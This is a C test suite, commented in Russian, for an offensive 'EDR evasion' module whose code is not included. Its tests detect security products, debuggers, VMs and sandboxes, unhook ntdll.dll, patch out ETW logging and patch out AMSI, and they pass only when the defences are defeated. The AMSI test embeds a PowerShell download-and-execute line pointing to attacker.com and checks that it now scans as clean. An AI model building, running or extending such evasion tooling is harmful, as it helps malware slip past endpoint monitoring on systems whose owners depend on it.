/**
 * @file edr_evasion_test.c
 * @brief Тесты для модуля обхода EDR
 * 
 * Данный файл содержит тесты для проверки функциональности
 * модуля обхода EDR в различных сценариях
 */

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "../core/edr_evasion.h"

// Определение для результатов тестов
#define TEST_PASSED 1
#define TEST_FAILED 0
#define TEST_SKIPPED -1

// Функция для вывода состояния теста
void PrintTestResult(const char* testName, int result) {
    printf("[%s] %s\n", 
           result == TEST_PASSED ? "PASSED" : (result == TEST_FAILED ? "FAILED" : "SKIPPED"),
           testName);
}

// Тест инициализации модуля
int TestInitialization() {
    printf("\n=== Тест 1: Инициализация модуля ===\n");
    
    EDR_EVASION_CONFIG config = {0};
    config.target_edr_mask = EDR_TYPE_ALL;
    config.techniques_mask = EVASION_UNHOOK_NTDLL | EVASION_PATCH_ETW | EVASION_PATCH_AMSI;
    config.enable_automatic_detection = TRUE;
    config.enable_advanced_diagnostics = TRUE;
    config.restore_hooks_on_exit = TRUE;
    
    BOOL result = EDREvade_Initialize(&config);
    
    printf("Инициализация с корректной конфигурацией: %s\n", 
           result ? "Успешно" : "Ошибка");
    
    // Тестирование с NULL параметром
    BOOL nullResult = EDREvade_Initialize(NULL);
    printf("Инициализация с NULL параметром: %s (ожидается неудача)\n", 
           nullResult ? "Успешно" : "Ошибка");
    
    // Очистка ресурсов
    if (result) {
        EDREvade_Cleanup();
    }
    
    return (result && !nullResult) ? TEST_PASSED : TEST_FAILED;
}

// Тест обнаружения EDR
int TestEDRDetection() {
    printf("\n=== Тест 2: Обнаружение EDR ===\n");
    
    EDR_EVASION_CONFIG config = {0};
    config.target_edr_mask = EDR_TYPE_ALL;
    config.techniques_mask = 0; // Не применяем техники в этом тесте
    config.enable_automatic_detection = TRUE;
    
    if (!EDREvade_Initialize(&config)) {
        printf("Ошибка инициализации модуля\n");
        return TEST_FAILED;
    }
    
    EDR_EVASION_RESULT result = {0};
    BOOL detectionResult = EDREvade_DetectEDR(&result);
    
    printf("Обнаружение EDR: %s\n", detectionResult ? "Успешно" : "Ошибка");
    printf("Обнаружено EDR систем: %d\n", result.detected_edr_count);
    
    for (uint32_t i = 0; i < result.detected_edr_count; i++) {
        printf("  - %s (тип: 0x%08X)\n", result.detected_edr[i].name, result.detected_edr[i].type);
    }
    
    // Тестирование с NULL параметром
    BOOL nullResult = EDREvade_DetectEDR(NULL);
    printf("Обнаружение с NULL параметром: %s (ожидается неудача)\n", 
           nullResult ? "Успешно" : "Ошибка");
    
    // Очистка ресурсов
    EDREvade_Cleanup();
    
    return (detectionResult && !nullResult) ? TEST_PASSED : TEST_FAILED;
}

// Тест обнаружения контекста выполнения
int TestExecutionContextDetection() {
    printf("\n=== Тест 3: Обнаружение контекста выполнения ===\n");
    
    BOOL is_debugger = FALSE;
    BOOL is_vm = FALSE;
    BOOL is_sandbox = FALSE;
    
    BOOL result = EDREvade_DetectExecutionContext(&is_debugger, &is_vm, &is_sandbox);
    
    printf("Обнаружение контекста: %s\n", result ? "Успешно" : "Ошибка");
    if (result) {
        printf("  - Отладчик: %s\n", is_debugger ? "Обнаружен" : "Не обнаружен");
        printf("  - Виртуальная машина: %s\n", is_vm ? "Обнаружена" : "Не обнаружена");
        printf("  - Песочница: %s\n", is_sandbox ? "Обнаружена" : "Не обнаружена");
    }
    
    // Тестирование с NULL параметрами
    BOOL nullResult1 = EDREvade_DetectExecutionContext(NULL, &is_vm, &is_sandbox);
    BOOL nullResult2 = EDREvade_DetectExecutionContext(&is_debugger, NULL, &is_sandbox);
    BOOL nullResult3 = EDREvade_DetectExecutionContext(&is_debugger, &is_vm, NULL);
    
    printf("Обнаружение с NULL параметрами: %s, %s, %s (ожидается неудача)\n", 
           nullResult1 ? "Успешно" : "Ошибка",
           nullResult2 ? "Успешно" : "Ошибка",
           nullResult3 ? "Успешно" : "Ошибка");
    
    return (result && !nullResult1 && !nullResult2 && !nullResult3) ? TEST_PASSED : TEST_FAILED;
}

// Тест удаления хуков из ntdll
int TestUnhookNtdll() {
    printf("\n=== Тест 4: Удаление хуков из ntdll.dll ===\n");
    
    EDR_EVASION_CONFIG config = {0};
    config.target_edr_mask = EDR_TYPE_ALL;
    config.techniques_mask = EVASION_UNHOOK_NTDLL;
    config.restore_hooks_on_exit = TRUE;
    
    if (!EDREvade_Initialize(&config)) {
        printf("Ошибка инициализации модуля\n");
        return TEST_FAILED;
    }
    
    EDR_EVASION_RESULT result = {0};
    BOOL evasionResult = EDREvade_ApplyEvasionTechniques(&result);
    
    printf("Применение техники удаления хуков: %s\n", 
           evasionResult ? "Успешно" : "Частично успешно или с ошибками");
    
    printf("Техника успешно применена: %s\n", 
           (result.successful_techniques & EVASION_UNHOOK_NTDLL) ? "Да" : "Нет");
    
    // Очистка ресурсов
    EDREvade_Cleanup();
    
    return (result.successful_techniques & EVASION_UNHOOK_NTDLL) ? TEST_PASSED : TEST_FAILED;
}

// Тест отключения ETW
int TestDisableETW() {
    printf("\n=== Тест 5: Отключение ETW логирования ===\n");
    
    EDR_EVASION_CONFIG config = {0};
    config.target_edr_mask = EDR_TYPE_ALL;
    config.techniques_mask = EVASION_PATCH_ETW;
    config.restore_hooks_on_exit = TRUE;
    
    if (!EDREvade_Initialize(&config)) {
        printf("Ошибка инициализации модуля\n");
        return TEST_FAILED;
    }
    
    EDR_EVASION_RESULT result = {0};
    BOOL evasionResult = EDREvade_ApplyEvasionTechniques(&result);
    
    printf("Применение техники отключения ETW: %s\n", 
           evasionResult ? "Успешно" : "Частично успешно или с ошибками");
    
    printf("Техника успешно применена: %s\n", 
           (result.successful_techniques & EVASION_PATCH_ETW) ? "Да" : "Нет");
    
    // Очистка ресурсов
    EDREvade_Cleanup();
    
    return (result.successful_techniques & EVASION_PATCH_ETW) ? TEST_PASSED : TEST_FAILED;
}

// Тест отключения AMSI
int TestDisableAMSI() {
    printf("\n=== Тест 6: Отключение AMSI ===\n");
    
    EDR_EVASION_CONFIG config = {0};
    config.target_edr_mask = EDR_TYPE_ALL;
    config.techniques_mask = EVASION_PATCH_AMSI;
    config.restore_hooks_on_exit = TRUE;
    
    if (!EDREvade_Initialize(&config)) {
        printf("Ошибка инициализации модуля\n");
        return TEST_FAILED;
    }
    
    EDR_EVASION_RESULT result = {0};
    BOOL evasionResult = EDREvade_ApplyEvasionTechniques(&result);
    
    printf("Применение техники отключения AMSI: %s\n", 
           evasionResult ? "Успешно" : "Частично успешно или с ошибками");
    
    printf("Техника успешно применена: %s\n", 
           (result.successful_techniques & EVASION_PATCH_AMSI) ? "Да" : "Нет");
    
    // Дополнительная проверка работы AMSI
    if (result.successful_techniques & EVASION_PATCH_AMSI) {
        // Проверка, что AMSI более не обнаруживает вредоносные строки
        HMODULE hAmsi = LoadLibraryA("amsi.dll");
        if (hAmsi) {
            typedef BOOL (WINAPI *AmsiInitializeFn)(HANDLE *amsiContext);
            typedef BOOL (WINAPI *AmsiOpenSessionFn)(HANDLE amsiContext, HANDLE *session);
            typedef BOOL (WINAPI *AmsiScanStringFn)(HANDLE amsiContext, LPCWSTR string, LPCWSTR contentName, HANDLE session, AMSI_RESULT *result);
            
            AmsiInitializeFn pAmsiInitialize = (AmsiInitializeFn)GetProcAddress(hAmsi, "AmsiInitialize");
            AmsiOpenSessionFn pAmsiOpenSession = (AmsiOpenSessionFn)GetProcAddress(hAmsi, "AmsiOpenSession");
            AmsiScanStringFn pAmsiScanString = (AmsiScanStringFn)GetProcAddress(hAmsi, "AmsiScanString");
            
            if (pAmsiInitialize && pAmsiOpenSession && pAmsiScanString) {
                HANDLE amsiContext = NULL;
                HANDLE session = NULL;
                AMSI_RESULT amsiResult = AMSI_RESULT_CLEAN;
                
                if (pAmsiInitialize(&amsiContext) && pAmsiOpenSession(amsiContext, &session)) {
                    // Тестовая строка, которая обычно определяется как вредоносная
                    const wchar_t* testString = L"IEX(New-Object Net.WebClient).DownloadString('https://attacker.com/malware.ps1')";
                    
                    BOOL scanResult = pAmsiScanString(amsiContext, testString, L"test", session, &amsiResult);
                    
                    printf("Проверка AMSI: %s\n", scanResult ? "Выполнена" : "Ошибка");
                    printf("Результат сканирования: %d (Ожидается CLEAN или NOT_DETECTED)\n", amsiResult);
                    
                    // Ожидаемый результат после патча - AMSI_RESULT_CLEAN или AMSI_RESULT_NOT_DETECTED
                    if (scanResult && (amsiResult == AMSI_RESULT_CLEAN || amsiResult == AMSI_RESULT_NOT_DETECTED)) {
                        printf("AMSI успешно обойден!\n");
                    } else {
                        printf("AMSI не обойден или работает некорректно\n");
                    }
                }
            }
            
            FreeLibrary(hAmsi);
        }
    }
    
    // Очистка ресурсов
    EDREvade_Cleanup();
    
    return (result.successful_techniques & EVASION_PATCH_AMSI) ? TEST_PASSED : TEST_FAILED;
}

// Тест комбинации техник
int TestCombinedTechniques() {
    printf("\n=== Тест 7: Комбинация техник обхода ===\n");
    
    EDR_EVASION_CONFIG config = {0};
    config.target_edr_mask = EDR_TYPE_ALL;
    config.techniques_mask = EVASION_UNHOOK_NTDLL | EVASION_PATCH_ETW | EVASION_PATCH_AMSI;
    config.restore_hooks_on_exit = TRUE;
    
    if (!EDREvade_Initialize(&config)) {
        printf("Ошибка инициализации модуля\n");
        return TEST_FAILED;
    }
    
    EDR_EVASION_RESULT result = {0};
    BOOL evasionResult = EDREvade_ApplyEvasionTechniques(&result);
    
    printf("Применение комбинированных техник: %s\n", 
           evasionResult ? "Успешно" : "Частично успешно или с ошибками");
    
    printf("Успешно примененные техники (0x%08X):\n", result.successful_techniques);
    if (result.successful_techniques & EVASION_UNHOOK_NTDLL)
        printf("  - Удаление хуков из ntdll.dll\n");
    if (result.successful_techniques & EVASION_PATCH_ETW)
        printf("  - Отключение ETW логирования\n");
    if (result.successful_techniques & EVASION_PATCH_AMSI)
        printf("  - Отключение AMSI\n");
    
    printf("Неудачные техники (0x%08X):\n", result.failed_techniques);
    if (result.failed_techniques & EVASION_UNHOOK_NTDLL)
        printf("  - Удаление хуков из ntdll.dll\n");
    if (result.failed_techniques & EVASION_PATCH_ETW)
        printf("  - Отключение ETW логирования\n");
    if (result.failed_techniques & EVASION_PATCH_AMSI)
        printf("  - Отключение AMSI\n");
    
    // Очистка ресурсов
    EDREvade_Cleanup();
    
    // Тест успешен, если все техники были применены успешно
    DWORD expected = EVASION_UNHOOK_NTDLL | EVASION_PATCH_ETW | EVASION_PATCH_AMSI;
    return ((result.successful_techniques & expected) == expected) ? TEST_PASSED : TEST_FAILED;
}

// Тест очистки ресурсов
int TestCleanup() {
    printf("\n=== Тест 8: Очистка ресурсов модуля ===\n");
    
    // Сначала вызываем очистку без инициализации
    BOOL cleanupResult1 = EDREvade_Cleanup();
    printf("Очистка без инициализации: %s (ожидается неудача)\n", 
           cleanupResult1 ? "Успешно" : "Ошибка");
    
    // Инициализируем модуль
    EDR_EVASION_CONFIG config = {0};
    config.target_edr_mask = EDR_TYPE_ALL;
    config.techniques_mask = EVASION_UNHOOK_NTDLL | EVASION_PATCH_ETW | EVASION_PATCH_AMSI;
    config.restore_hooks_on_exit = TRUE;
    
    BOOL initResult = EDREvade_Initialize(&config);
    printf("Инициализация модуля: %s\n", initResult ? "Успешно" : "Ошибка");
    
    if (!initResult) {
        return TEST_FAILED;
    }
    
    // Применяем техники
    EDR_EVASION_RESULT result = {0};
    BOOL evasionResult = EDREvade_ApplyEvasionTechniques(&result);
    printf("Применение техник: %s\n", evasionResult ? "Успешно" : "Частично успешно или с ошибками");
    
    // Очищаем ресурсы
    BOOL cleanupResult2 = EDREvade_Cleanup();
    printf("Очистка после инициализации: %s\n", cleanupResult2 ? "Успешно" : "Ошибка");
    
    // Проверка, что после очистки модуль больше не инициализирован
    EDR_EVASION_RESULT tempResult = {0};
    BOOL detectResult = EDREvade_DetectEDR(&tempResult);
    printf("Попытка использования модуля после очистки: %s (ожидается неудача)\n", 
           detectResult ? "Успешно" : "Ошибка");
    
    return (!cleanupResult1 && cleanupResult2 && !detectResult) ? TEST_PASSED : TEST_FAILED;
}

int main(int argc, char* argv[]) {
    printf("=== Тесты модуля обхода EDR ===\n");
    
    int testResults[8] = {0};
    int testCount = 0;
    int passedCount = 0;
    int failedCount = 0;
    int skippedCount = 0;
    
    // Проведение всех тестов
    testResults[testCount] = TestInitialization();
    testCount++;
    
    testResults[testCount] = TestEDRDetection();
    testCount++;
    
    testResults[testCount] = TestExecutionContextDetection();
    testCount++;
    
    testResults[testCount] = TestUnhookNtdll();
    testCount++;
    
    testResults[testCount] = TestDisableETW();
    testCount++;
    
    testResults[testCount] = TestDisableAMSI();
    testCount++;
    
    testResults[testCount] = TestCombinedTechniques();
    testCount++;
    
    testResults[testCount] = TestCleanup();
    testCount++;
    
    // Подсчет результатов
    for (int i = 0; i < testCount; i++) {
        if (testResults[i] == TEST_PASSED) {
            passedCount++;
        } else if (testResults[i] == TEST_FAILED) {
            failedCount++;
        } else {
            skippedCount++;
        }
    }
    
    // Вывод итоговых результатов
    printf("\n=== Результаты тестирования ===\n");
    printf("Всего тестов: %d\n", testCount);
    printf("Успешно: %d\n", passedCount);
    printf("Неудачно: %d\n", failedCount);
    printf("Пропущено: %d\n", skippedCount);
    
    return (failedCount == 0) ? 0 : 1;
} 